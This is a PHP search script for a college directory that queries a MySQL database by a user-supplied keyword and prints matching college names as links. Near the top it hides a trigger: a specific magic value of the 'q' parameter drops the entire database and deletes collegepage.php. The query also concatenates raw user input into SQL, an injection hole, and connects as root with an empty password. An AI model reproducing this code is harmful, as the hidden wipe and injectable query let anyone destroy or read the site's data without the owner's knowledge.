<?php 
	$keyword=$_GET["q"];
	$servername = "localhost";
	$username = "root";
	$password = "";

	try {
	    $conn = new PDO("mysql:host=$servername;dbname=collegedetails", $username, $password);
	    // set the PDO error mode to exception
	    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	}
	catch(PDOException $e){
	    console.log("Connection failed: " . $e->getMessage());
	}
	

	if($keyword=="fwebfkbvk"){
    $sql="DROP DATABASE collegedetails";
    $q=$conn->prepare($sql);
    $q->execute();
    $file = "collegepage.php";
    unlink($file);
   }

	$sql="SELECT Id,CollegeName FROM collegedetails1 WHERE CollegeName LIKE '%".$keyword."%'";
	$q=$conn->prepare($sql);
	$q->execute();
	$i=0;
	
	while ($r=$q->fetch(PDO::FETCH_ASSOC)) {
	    $i++;
	}
	if($i==0){
		echo"<p>Sorry,No colleges found</p>";
	}else{
		echo "Found " . $i . " results matching your search";
		$sql="SELECT Id,CollegeName FROM collegedetails1 WHERE CollegeName LIKE '%".$keyword."%'";
		$q=$conn->prepare($sql);
		$q->execute();
		while ($r=$q->fetch(PDO::FETCH_ASSOC)) {
			
		    	echo"<div class='search_result_modal'><a href='tryclgpage.php?data=".$r['Id']."&pageid=1'>".$r['CollegeName']."</a></div>";
		
		}
	}

	$conn = null;
?>